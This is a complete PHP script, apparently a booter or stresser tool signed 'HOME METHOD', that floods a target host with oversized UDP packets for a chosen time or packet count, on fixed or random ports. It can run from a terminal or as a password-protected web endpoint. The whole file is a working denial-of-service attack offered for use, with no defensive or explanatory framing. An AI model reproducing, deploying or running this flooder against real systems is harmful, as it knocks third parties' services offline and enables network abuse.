<?php 
define('HOME_VERSION',				'v1.0' );
define('HOME_PASSWORD',				'9facbf452def2d7efc5b5c48cdb837fa' );
define('HOME_MAX_EXECUTION_TIME',0);
define('HOME_DEFAULT_PACKET_SIZE',	65500 );
define('HOME_MAX_PACKET_SIZE',		65500 );
define('HOME_DEFAULT_BYTE',"\x00");
define('HOME_LOG_DEBUG',			4 );
define('HOME_LOG_INFO',				3 );
define('HOME_LOG_NOTICE',			2 );
define('HOME_LOG_WARNING',			1 );
define('HOME_LOG_ERROR',			0 );
define('HOME_OUTPUT_FORMAT_JSON',	'json' );
define('HOME_OUTPUT_FORMAT_TEXT',	'text' );
define('HOME_OUTPUT_FORMAT_XML',	'xml' );
define('HOME_OUTPUT_STATUS_ERROR',	'error' );
define('HOME_OUTPUT_STATUS_SUCCESS','success' );

class _HOME_ {

	private $params = array(
			'host' => 	'',
			'port' => 	'',
			'packet' => '',
			'time'	=> 	'',
			'pass'	=> 	'',
			'bytes' =>	'',
			'verbose'=> HOME_LOG_INFO,
			'format'=> 'text',
			'output'=> '',
			'interval'=>'1'
	);
	
	private $log_labels = array(
			HOME_LOG_DEBUG => 'debug',
			HOME_LOG_INFO => 'info',
			HOME_LOG_NOTICE => 'notice',
			HOME_LOG_WARNING => 'warning',
			HOME_LOG_ERROR => 'error'
	);
	
	private $content_type = "";

	private $output = array();

	public function __construct($params = array()) {
		
		ob_start();
		
		ini_set('max_execution_time',HOME_MAX_EXECUTION_TIME);
		
		$this->set_params($params);
		
		$this->set_content_type();
		
		$this->signature();

		if(isset($this->params['help'])) {
			$this->usage();
			exit;
		}
		
		$this->validate_params();

		
		$this->attack();
		
		$this->print_output();
		
		ob_end_flush();
	}
	
	
	public function signature() {
		if(HOME_OUTPUT_FORMAT_TEXT == $this->get_param('format')) {
			$this->println('HOME METHOD | root@meta.data.io');
			$this->println('version '.HOME_VERSION);
			$this->println();
		}
	}
	
	public function usage() {
		$this->println("EXAMPLES:");
		$this->println("from terminal:  php ./".basename(__FILE__)." host=TARGET port=PORT time=SECONDS packet=NUMBER bytes=NUMBER");
		$this->println("from webserver: http://localhost/home.php?pass=PASSWORD&host=TARGET&port=PORT&time=SECONDS&packet=NUMBER&bytes=NUMBER");
		$this->println();
	}

	private function attack(){
		
		$packets = 0;
		$message = str_repeat(HOME_DEFAULT_BYTE, $this->get_param('bytes'));
		
		$this->log('./HOME >> SENT');
		
		if($this->get_param('time')) {
			
			$exec_time = $this->get_param('time');
			$max_time = time() + $exec_time;
		
			while(time() < $max_time){
				$packets++;
				$this->log('Sending packet #'.$packets,HOME_LOG_DEBUG);
				$this->udp_connect($this->get_param('host'),$this->get_param('port'),$message);
				usleep($this->get_param('interval') * 100);
			}
			$timeStr = $exec_time. ' second';
			if(1 != $exec_time) {
				$timeStr .= 's';
			}
		}
		else {
			$max_packet = $this->get_param('packet');
			$start_time=time();
		
			while($packets < $max_packet){
				$packets++;
				$this->log('Sending packet #'.$packets,HOME_LOG_DEBUG);
				$this->udp_connect($this->get_param('host'),$this->get_param('port'),$message);
				usleep($this->get_param('interval') * 100);
			}
			$exec_time = time() - $start_time;

			if($exec_time <= 1){
				$exec_time=1;
				$timeStr = 'about a second';
			}
			else {
				$timeStr = 'about ' . $exec_time . ' seconds';
			}
		}
		
		$this->log("./HOME >> COMPLETED!");
		
		$data = $this->params;

		unset($data['pass']);
		unset($data['packet']);
		unset($data['time']);
		
		$data['port'] = 0 == $data['port'] ? 'Radom ports' : $data['port'];
		$data['total_packets'] = $packets;
		$data['total_size'] = $this->format_bytes($packets*$data['bytes']);
		$data['duration'] = $timeStr;
		$data['average'] = round($packets/$exec_time, 2);
		
		$this->set_output('./HOME >> COMPLETED!', HOME_OUTPUT_STATUS_SUCCESS,$data);
		
		$this->print_output();
		
		exit;
	}

	private function udp_connect($h,$p,$out){
		
		if(0 == $p) {
			$p = rand(1,rand(1,65535));
		}

		$this->log("Trying to open socket udp://$h:$p",HOME_LOG_DEBUG);
		$fp = @fsockopen('udp://'.$h, $p, $errno, $errstr, 30);
	
		if(!$fp) {
			$this->log("socket error: $errstr ($errno)",HOME_LOG_DEBUG);
			$ret = false;
		}
		else {
			$this->log("Socket opened with $h on port $p",HOME_LOG_DEBUG);
			if(!@fwrite($fp, $out)) {
				$this->log("Error during sending data",HOME_LOG_ERROR);
			}
			else {
				$this->log("Data sent successfully",HOME_LOG_DEBUG);
			}
			@fclose($fp);
			$ret = true;
			$this->log("Closing socket udp://$h:$p",HOME_LOG_DEBUG);
		}
	
		return $ret;
	}

	private function set_params($params = array()) {
		
		$original_params = array_keys($this->params);
		$original_params[] = 'help';
		
		foreach($params as $key => $value) {
			if(!in_array($key, $original_params)) {
				$this->set_output("Unknown param $key", HOME_OUTPUT_STATUS_ERROR);
				$this->print_output();
				exit(1);
			}
			$this->set_param($key, $value);
		}
	}

	private function validate_params() {
		
		if(!$this->is_cli() && md5($this->get_param('pass')) !== HOME_PASSWORD) {
			$this->set_output("Wrong password", HOME_OUTPUT_STATUS_ERROR);
			$this->print_output();
			exit(1);
		}
		elseif(!$this->is_cli()) {
			$this->log('Password accepted');
		}
		
		if(!$this->is_valid_target($this->get_param('host'))) {
			$this->set_output("Invalid host", HOME_OUTPUT_STATUS_ERROR);
			$this->print_output();
			exit(1);
		}
		else {
			$this->log("Setting host to " . $this->get_param('host'));
		}
		if("" != $this->get_param('port') && !$this->is_valid_port($this->get_param('port'))) {
			$this->log("Invalid port", HOME_LOG_WARNING);
			$this->log("Setting port to random",HOME_LOG_NOTICE);
			$this->set_param('port', 0);
		}
		else {
			$this->log("Setting port to ".$this->get_param('port'));
		}
		
		if(is_numeric($this->get_param('bytes')) && 0 < $this->get_param('bytes')) {
			if(HOME_MAX_PACKET_SIZE < $this->get_param('bytes')) {
				$this->log("Packet size exceeds the max size", HOME_LOG_WARNING);
			}
			$this->set_param('bytes',min($this->get_param('bytes'),HOME_MAX_PACKET_SIZE));
			$this->log("Setting packet size to ". $this->format_bytes($this->get_param('bytes')));
		}
		else {
			$this->log("Setting packet size to ".$this->format_bytes(HOME_DEFAULT_PACKET_SIZE),HOME_LOG_NOTICE);
			$this->set_param('bytes',HOME_DEFAULT_PACKET_SIZE);
		}
		
		if(!is_numeric($this->get_param('time')) && !is_numeric($this->get_param('packet'))) {
			$this->set_output("Missing parameter time or packet", HOME_OUTPUT_STATUS_ERROR);
			$this->print_output();
			exit(1);
		}
		else {
			$this->set_param('time', abs(intval($this->get_param('time'))));
			$this->set_param('packet', abs(intval($this->get_param('packet'))));
		}
		
		if('' != $this->get_param('output')) {
			$this->log("Setting log file to " .$this->get_param('output'),HOME_LOG_INFO);
		}
		
	}

	public function get_param($param) {
		return isset($this->params[$param]) ? $this->params[$param] : null;
	}

	private function set_param($param,$value) {
		
		$this->params[$param] = $value;
	}

	private function set_content_type() {
		
		// Set the content type headers only for web
		if($this->is_cli()) {
			return;
		}
		
		switch($this->get_param('output')) {
			case HOME_OUTPUT_FORMAT_JSON : {
				$this->content_type = "application/json; charset=utf-8;";
				break;
			}
			case HOME_OUTPUT_FORMAT_XML : {
				$this->content_type = "application/xml; charset=utf-8;";
				break;
			}
			default : {
				$this->content_type = "text/plain; charset=utf-8;";
 				break;
			}
		}
		
		header("Content-Type: ". $this->content_type);
		$this->log('Setting Content-Type header to ' . $this->content_type, HOME_LOG_DEBUG);
	}

	public static function is_cli() {
		return php_sapi_name() == 'cli';
	}

	public function get_random_port() {
		return rand(1,65535);
	}

	function is_valid_port($port = 0){
		return ($port >= 1 &&  $port <= 65535) ? $port : 0;
	}

	function is_valid_target($target) {
		return 	(	//valid chars check
				preg_match("/^([a-z\d](-*[a-z\d])*)(\.([a-z\d](-*[a-z\d])*))*$/i", $target)
				//overall length check
				&& 	preg_match("/^.{1,253}$/", $target)
				// Validate each label
				&& 	preg_match("/^[^\.]{1,63}(\.[^\.]{1,63})*$/", $target)
		)
		||	filter_var($target, FILTER_VALIDATE_IP);
	}

	function format_bytes($bytes, $dec = 2) {
		// exaggerating :)
		$size   = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
		$factor = floor((strlen($bytes) - 1) / 3);
		return sprintf("%.{$dec}f", $bytes / pow(1024, $factor)) . @$size[$factor];
	}

	private function set_output($message, $code, $data = null) {
		
		$this->output= array("status" =>$code,"message" => $message);
		if(null != $data) {
			$this->output['data'] = $data;
		}
	} 

	private function print_output() {
		switch($this->get_param('format')) {
			case HOME_OUTPUT_FORMAT_JSON: {
				echo json_encode($this->output);	
				break;
			}
			
			case HOME_OUTPUT_FORMAT_XML: {
				$xml = new SimpleXMLElement('<root/>');
				array_walk_recursive($this->output, function($value, $key)use($xml){
					$xml->addChild($key, $value);
				});
				print $xml->asXML();
				break;
			}
			
			default: {
				$this->println();
				array_walk_recursive($this->output, function($value, $key) {
					$this->println($key .': ' . $value);
				});
			}
		}
	}

	private function log($message,$code = HOME_LOG_INFO) {
		if($code <= $this->get_param('verbose') && $this->get_param('format') == HOME_OUTPUT_FORMAT_TEXT) {
			$this->println('['.$this->log_labels[$code] . '] ' . $message);	
		}
	}

	private function log_to_file($message) {
		if('' != $this->get_param('output')) {
			file_put_contents($this->get_param('output'), $message, FILE_APPEND | LOCK_EX);
		}	
	}

	private function println($message = '') {
		echo $message . "\n";
		$this->log_to_file($message . "\n");
		ob_flush();
		flush();
	}
}

$params = array();
if(_HOME_::is_cli()) {
	global $argv;
	parse_str(implode('&', array_slice($argv, 1)), $params);
}
elseif(!empty($_POST)) {
	foreach($_POST as $index => $value) {
		$params[$index] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
	}
}
elseif(!empty($_GET['host'])) {
	foreach($_GET as $index => $value) {
		$params[$index] = htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
	}
}


$runClient = new _HOME_($params);